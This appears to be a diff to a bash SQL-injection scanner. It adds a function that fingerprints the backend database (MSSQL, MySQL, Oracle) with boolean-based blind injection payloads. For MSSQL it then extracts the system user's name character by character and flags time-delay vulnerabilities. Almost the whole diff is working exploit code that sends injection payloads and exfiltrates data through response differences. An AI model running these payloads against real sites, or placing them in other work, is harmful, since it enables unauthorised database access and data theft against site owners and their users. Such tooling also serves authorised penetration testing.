@@ -461,6 +461,146 @@ cat ./payloads/system-params.txt | while read inj3ct ; do
 done
 }
 
+dbtypecheck()
+{
+# try to figure out the backend db using conditional :
+echo "Running conditional tests to determine DB type"
+#mssqlcheck - only works on numeric params
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+0)+then+1+else+0+end)$end"`
+requester
+#echo "debug sending $request"
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
+requester
+#echo "debug sending $request"
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	mssqldb=1
+fi
+#if [[ "$status_true" == "$status_false" ]] ; then
+	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		tput sgr0 # Reset attributes.
+		mssqldb=1
+
+###get the length of the string
+horiz=40
+oflag=1
+	while [[ $oflag -lt $horiz ]] ; do
+		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
+		requester
+		#echo "debug sending $request"
+		status_false=`echo $response | cut -d ":" -f 1`
+		length_false=`echo $response | cut -d ":" -f 2` 
+		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(len(system_user)+=+$oflag)+then+1+else+0+end)"`
+		requester
+		#echo "debug sending iflag $request"
+		status_true=`echo $response | cut -d ":" -f 1`
+		length_true=`echo $response | cut -d ":" -f 2`
+				
+		((lendiff=$length_true-$length_false))
+		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+			echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+			sysuserlen=$oflag
+			oflag=40
+		fi
+		#if [[ "$status_true" == "$status_false" ]] ; then
+			#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+		#
+		#	fi
+		#fi
+		((oflag=$oflag+1)) 
+	done
+###
+
+
+
+###
+vert=128
+horiz=$sysuserlen
+oflag=1
+iflag=1
+	while [[ $oflag -le $horiz ]] ; do
+		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),$oflag,1))+=+$iflag)+then+1+else+0+end)$end"`
+		requester
+		#echo "debug sending iflag $request"
+		status_true=`echo $response | cut -d ":" -f 1`
+		length_true=`echo $response | cut -d ":" -f 2`
+		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
+		requester
+		#echo "debug sending $request"
+		status_false=`echo $response | cut -d ":" -f 1`
+		length_false=`echo $response | cut -d ":" -f 2` 
+		((lendiff=$length_true-$length_false))
+		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+			echo -n "$iflag "
+			iflag=255
+		fi
+		#if [[ "$status_true" == "$status_false" ]] ; then
+			#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+		#
+		#	fi
+		#fi
+		((iflag=$iflag+1)) 
+		if [[ $iflag == 256 ]] ; then
+			((iflag=0))
+			((oflag=$oflag+1))
+		fi	
+		done
+		echo ""
+###
+	fi
+#fi
+
+#mysqlcheck - only works on numeric params
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1/case+when+ascii(substr(system_user(),1,1))+>+0+then+1+else+0+end$end"`
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1/case+when+ascii(substr(system_user(),1,1))+>+255+then+1+else+0+end$end"`
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	mysqldb=1
+fi
+#if [[ "$status_true" == "$status_false" ]] ; then
+	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then			
+		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		tput sgr0 # Reset attributes.
+		mysqldb=1
+	fi
+#fi
+
+#oraclecheck - only works on numeric params
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substr((select+user+from+dual),1,1))+>+0)+then+1+else+0+end)$end"`
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substr((select+user+from+dual),1,1))+>+255)+then+1+else+0+end)$end"`
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
+	oracle=1
+fi
+#if [[ "$status_true" == "$status_false" ]] ; then
+	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then			
+		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		tput sgr0 # Reset attributes.
+		oracle=1
+	fi
+#fi
+}
+
 ##### END OF FUNCTION DEFINITIONS SECTION ######	
 #remove any residual files left lying about: 
 rm cleanscannerinputlist.txt 2>/dev/null
@@ -1585,6 +1725,7 @@ cat cleanscannerinputlist.txt | while read i; do
 						#fi
 						#end of status code and error checking subsection
 						#beginning of time diff scan subsection
+						timedelay=0
 						if [[ true = "$e" || true = "$b" ]] ; then
 							and1eq1=`cat ./session/$safehostname.$safelogname.and1eq1.txt 2>/dev/null`
 							and1eq1time=`echo "$and1eq1" | cut -d ":" -f 3| cut -d "." -f1`
@@ -1593,6 +1734,7 @@ cat cleanscannerinputlist.txt | while read i; do
 							if (($and1eq2time>$and1eq1time)) ; then
 							#set the vulnerable flag and sploit that mutha
 							vulnerable=1
+							timedelay=1
 								if [[ $method != "POST" ]] ; then #we're doing a get - simples
 									echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt 
 									echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
@@ -1627,8 +1769,12 @@ cat cleanscannerinputlist.txt | while read i; do
 		#for each payload the vulnerable flag is tested; if true, we call the orderby function to enumerate columns  
 		if [[ $vulnerable == 1 ]] ; then
 			orderby
+			#if [[ $success == 0 ]] ; then
+				dbtypecheck
+			#fi
 		fi 
 		vulnerable=0
+		success=0
 		#echo "DEBUG 001 sessionStorage=$sessionStorage"
 		##END OF PER-PAYLOAD LOOP:	
 		done
